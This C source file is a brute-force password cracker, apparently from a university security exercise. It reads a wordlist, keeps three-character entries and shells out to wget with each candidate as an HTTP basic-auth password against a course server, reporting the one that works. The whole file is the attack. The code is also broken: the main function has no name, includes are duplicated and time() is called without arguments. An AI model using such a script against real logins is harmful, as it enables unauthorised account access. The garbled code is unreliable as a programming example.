#include <sys/times.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>

#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>
#include <sys/time.h>
#define ant 1e9
int ()
{
  FILE *fptr=NULL;
  int starttime,endtime,totaltime;
  int i,final,count=0;
  char ch[20],passwd[20],c,s1[100],s2[100];

 fptr=fopen("words","r");
  
starttime=time();
	if(fptr==NULL)
	{
		printf("file empty");
		exit(0);
	}
   strcpy(s1, "wget --http-user= --http-passwd=");
   strcpy(s2, " http://sec-crack.cs.rmit.edu./SEC/2/");

  while(!feof(fptr))
    {    
      i=0;
     c=getc(fptr);
      while(c!='\n')
        {
           ch[i]=c;
           i++;
	 c=getc(fptr);
        }
      ch[i]='\0';
      strcpy(passwd,ch);
     if(strlen(passwd)==3)
      {
      strcat(s1, passwd);
      strcat(s1,s2);           
      printf(" The combination sent is %s \n", s1); 

      final = system(s1);
	count++;

      if (final == 0)
          {
	      
		endtime=time();
		totaltime=(endtime-starttime);
		
            printf("\nsuccess  %s\n",passwd);
            printf("count %d",count);
	    printf("totaltime %1f\n",(double)totaltime/ant);

            exit(1);
          }


	  strcpy(s1, "");
	  strcpy(s1, "wget --http-user= --http-passwd=");
		
  
     }
  
  }

}
